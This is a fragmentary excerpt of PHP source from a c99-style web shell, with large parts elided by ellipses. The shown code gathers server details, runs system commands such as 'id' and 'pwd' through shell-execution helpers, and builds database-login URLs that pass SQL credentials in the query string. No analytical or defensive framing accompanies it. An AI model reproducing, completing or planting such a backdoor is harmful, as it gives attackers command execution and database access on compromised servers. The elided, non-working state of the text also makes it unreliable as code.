...
$ud = urlencode($d);
?><?php echo getenv("HTTP_HOST"); ?><?php echo $DISP_SERVER_SOFTWARE; ?><?php echo wordwrap(php_uname(),90,"<br>",1); ?><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?><?php $curl_on = @function_exists('curl_version');
echo "<br/>cURL: <b>".(($curl_on)?("<font color=green>ON</font>"):("<font color=red>OFF</font>")); ?><?php echo "<br/>MySQL: <b>";
...
if($ora_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";} ?><?php echo $hsafemode; ?><?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
...
if ($act == "sql")
{
 ...
 else
 {
  ...
  if (!empty($sql_db))
  {
   ?><?php echo $surl."w4/act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?><?php
...
?><?php echo $surl; ?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo $surl; ?><?php echo $dispd; ?><?php passthru('pwd'); ?><?php echo wordwrap(php_uname()); ?><?php echo $surl; ?><?php
      function rsg_read()
	{	
	$test="";
...
rsg_read();
	...
	?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $PHP_SELF; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo round(getmicrotime()-starttime,4); ?><?php chdir($lastdir); c99shexit(); ?>